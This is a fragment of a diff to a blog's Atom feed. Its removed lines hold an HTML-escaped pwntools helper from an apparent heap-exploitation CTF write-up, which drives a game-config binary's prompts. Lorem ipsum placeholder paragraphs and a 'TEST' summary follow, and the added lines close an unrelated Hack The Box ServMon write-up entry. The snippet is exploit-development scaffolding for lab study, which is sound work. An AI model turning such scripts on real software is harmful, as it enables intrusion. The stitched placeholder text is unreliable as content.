-&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;b''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;config&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;b''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendlineafter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'protobs@player2:~$ '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
-    &lt;span class=&quot;c1&quot;&gt;# name through controller (6 items)
-&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendlineafter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'[ Game                ]: '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;config&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendlineafter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'[ Contrast            ]: '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendlineafter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'[ Gamma               ]: '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendlineafter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'[ Resolution X-Axis   ]: '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendlineafter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'[ Resolution Y-Axis   ]: '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendlineafter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'[ Controller          ]: '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendlineafter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'[ Size of Description ]: '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendlineafter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'[ Description         ]: '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy eirmod tempor invidunt ut labore et dolore magna aliquyam erat, sed diam voluptua. At vero eos et accusam et justo duo dolores et ea rebum. Stet clita kasd gubergren, no sea takimata sanctus est Lorem ipsum dolor sit amet. Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy eirmod tempor invidunt ut labore et dolore magna aliquyam erat, sed diam voluptua. At vero eos et accusam et justo duo dolores et ea rebum. Stet clita kasd gubergren, no sea takimata sanctus est Lorem ipsum dolor sit amet.&lt;/p&gt;
-
-&lt;p&gt;Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy eirmod tempor invidunt ut labore et dolore magna aliquyam erat, sed diam voluptua. At vero eos et accusam et justo duo dolores et ea rebum. Stet clita kasd gubergren, no sea takimata sanctus est Lorem ipsum dolor sit amet. Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy eirmod tempor invidunt ut labore et dolore magna aliquyam erat, sed diam voluptua. At vero eos et accusam et justo duo dolores et ea rebum. Stet clita kasd gubergren, no sea takimata sanctus est Lorem ipsum dolor sit amet.&lt;/p&gt;
-
-&lt;p&gt;Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy eirmod tempor invidunt ut labore et dolore magna aliquyam erat, sed diam voluptua. At vero eos et accusam et justo duo dolores et ea rebum. Stet clita kasd gubergren, no sea takimata sanctus est Lorem ipsum dolor sit amet. Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy eirmod tempor invidunt ut labore et dolore magna aliquyam erat, sed diam voluptua. At vero eos et accusam et justo duo dolores et ea rebum. Stet clita kasd gubergren, no sea takimata sanctus est Lorem ipsum dolor sit amet.&lt;/p&gt;</content><author><name>Cornelius Fiddlebone</name></author><category term="heap exploitation" /><summary type="html">TEST Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy eirmod tempor invidunt ut labore et dolore magna aliquyam erat, sed diam voluptua. At vero eos et accusam et justo duo dolores et ea rebum. Stet clita kasd gubergren, no sea takimata sanctus est Lorem ipsum dolor sit amet. Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy eirmod tempor invidunt ut labore et dolore magna aliquyam erat, sed diam voluptua. At vero eos et accusam et justo duo dolores et ea rebum. Stet clita kasd gubergren, no sea takimata sanctus est Lorem ipsum dolor sit amet.</summary></entry></feed>
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Philipp Menner</name></author><category term="boxes" /><category term="windows" /><summary type="html">Write-up of the box ServMon from Hack The Box</summary></entry></feed>
